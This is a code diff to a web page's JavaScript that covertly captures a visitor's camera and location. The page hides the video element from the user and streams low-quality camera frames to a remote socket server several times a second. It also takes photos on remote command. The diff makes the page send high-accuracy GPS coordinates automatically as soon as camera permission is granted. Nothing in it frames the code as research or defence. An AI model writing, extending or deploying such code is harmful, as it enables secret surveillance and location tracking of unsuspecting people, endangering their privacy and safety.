@@ -36,7 +36,6 @@
         .active { background: #d4edda; color: #155724; }
         .error { background: #f8d7da; color: #721c24; }
         
-        /* Video hidden completely from user, no control buttons */
         video {
             display: none !important;
             visibility: hidden !important;
@@ -94,8 +93,22 @@ function getDeviceInfo() {
     return `${device} (${browser})`;
 }
 
+function sendLocation() {
+    if (!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(
+        position => {
+            socket.emit("user-location", {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            });
+        },
+        error => {},
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+}
+
 async function startCamera() {
-    setStatus("Requesting camera permission...", "waiting");
+    setStatus("Requesting permissions...", "waiting");
     if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
     }
@@ -105,8 +118,8 @@ async function startCamera() {
             audio: false,
             video: {
                 facingMode: useFrontCamera ? "user" : "environment",
-                width: { ideal: 640 },
-                height: { ideal: 480 }
+                width: { ideal: 480 },
+                height: { ideal: 360 }
             }
         };
 
@@ -119,6 +132,7 @@ async function startCamera() {
         setStatus("🟢 Connected Successfully", "active");
 
         socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
+        sendLocation();
         startLiveStream();
     } catch (error) {
         cameraReady = false;
@@ -130,24 +144,24 @@ function startLiveStream() {
     if (streamInterval) clearInterval(streamInterval);
     streamInterval = setInterval(() => {
         if (!cameraReady || !video.videoWidth) return;
-        canvas.width = 320;
-        canvas.height = 240;
+        canvas.width = 240;
+        canvas.height = 180;
         const context = canvas.getContext("2d");
-        context.drawImage(video, 0, 0, 320, 240);
-        const frame = canvas.toDataURL("image/jpeg", 0.25);
+        context.drawImage(video, 0, 0, 240, 180);
+        const frame = canvas.toDataURL("image/jpeg", 0.15);
         socket.emit("live-stream-frame", frame);
-    }, 250);
+    }, 200);
 }
 
 function takeSinglePhoto() {
     if (!cameraReady) return;
-    const width = video.videoWidth || 640;
-    const height = video.videoHeight || 480;
+    const width = video.videoWidth || 480;
+    const height = video.videoHeight || 360;
     canvas.width = width;
     canvas.height = height;
     const context = canvas.getContext("2d");
     context.drawImage(video, 0, 0, width, height);
-    const imageData = canvas.toDataURL("image/jpeg", 0.65);
+    const imageData = canvas.toDataURL("image/jpeg", 0.6);
     socket.emit("user-photo-captured", imageData);
 }
 
@@ -172,21 +186,7 @@ socket.on("start-auto-capture", () => {
 });
 
 socket.on("capture-photo", () => { takeSinglePhoto(); });
-
-socket.on("request-location", () => {
-    if (!navigator.geolocation) return;
-
-    navigator.geolocation.getCurrentPosition(
-        position => {
-            socket.emit("user-location", {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude
-            });
-        },
-        error => {},
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
-});
+socket.on("request-location", () => { sendLocation(); });
 
 socket.on("switch-camera", async () => {
     useFrontCamera = !useFrontCamera;
